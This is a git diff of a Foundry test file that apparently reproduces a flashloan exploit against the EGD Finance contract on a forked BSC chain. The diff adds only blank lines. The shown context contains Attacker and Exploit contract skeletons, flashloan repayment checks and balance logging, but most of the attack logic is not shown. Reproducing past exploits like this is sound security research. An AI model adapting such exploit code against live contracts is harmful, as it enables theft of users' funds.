@@ -27,6 +27,7 @@ address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
 address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;
 
 contract Attacker is Test {
+
     function setUp() public {
         vm.createSelectFork("bsc", 20_245_522);
 
@@ -63,10 +64,12 @@ contract Attacker is Test {
         console.log("-------------------------------- End Exploit ----------------------------------");
         emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
     }
+
 }
 
 /* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
 contract Exploit is Test {
+
     uint256 borrow1;
     uint256 borrow2;
 
@@ -124,13 +127,16 @@ contract Exploit is Test {
             require(suc, "Flashloan[2] payback failed");
         }
     }
+
 }
 /* -------------------- Interface -------------------- */
 
 interface IEGD_Finance {
+
     function bond(address invitor) external;
     function stake(uint256 amount) external;
     function calculateAll(address addr) external view returns (uint256);
     function claimAllReward() external;
     function getEGDPrice() external view returns (uint256);
+
 }
